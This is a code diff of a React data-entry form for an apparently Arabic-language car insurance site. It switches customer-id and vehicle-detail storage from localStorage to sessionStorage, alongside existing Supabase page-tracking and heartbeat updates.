@@ -15,7 +15,7 @@ export const DataForm = ({ className, ...props }) => {
 
   // Update Page Tracking & Heartbeat
   useEffect(() => {
-    const customerId = localStorage.getItem('customerId');
+    const customerId = sessionStorage.getItem('customerId');
     if (customerId) {
       supabase.from('customers').update({ 
         page: '2- صفحه البيانات',
@@ -26,7 +26,7 @@ export const DataForm = ({ className, ...props }) => {
     }
 
     const interval = setInterval(() => {
-      const id = localStorage.getItem('customerId');
+      const id = sessionStorage.getItem('customerId');
       if (id) {
         supabase.from('customers').update({ 
           last_heartbeat: Date.now() 
@@ -38,7 +38,7 @@ export const DataForm = ({ className, ...props }) => {
   }, []);
 
   const updateLastSeen = () => {
-    const customerId = localStorage.getItem('customerId');
+    const customerId = sessionStorage.getItem('customerId');
     if (customerId) {
       supabase.from('customers').update({ 
         last_update: Date.now() 
@@ -100,7 +100,7 @@ export const DataForm = ({ className, ...props }) => {
   const handleSubmit = (e) => {
     e.preventDefault();
     if (validate()) {
-      const customerId = localStorage.getItem('customerId');
+      const customerId = sessionStorage.getItem('customerId');
       if (customerId) {
         supabase.from('customers').update({
           full_name: formData.fullName,
@@ -112,8 +112,8 @@ export const DataForm = ({ className, ...props }) => {
           last_heartbeat: new Date().getTime()
         }).eq('id', customerId).then(({ error }) => { if (error) console.error("Supabase Update Error:", error) });
         
-        localStorage.setItem('carMakeModel', formData.carMakeModel);
-        localStorage.setItem('manufactureYear', formData.manufactureYear);
+        sessionStorage.setItem('carMakeModel', formData.carMakeModel);
+        sessionStorage.setItem('manufactureYear', formData.manufactureYear);
       }
       navigate("/offers", { state: { insuranceType: formData.insuranceType } });
     } else {
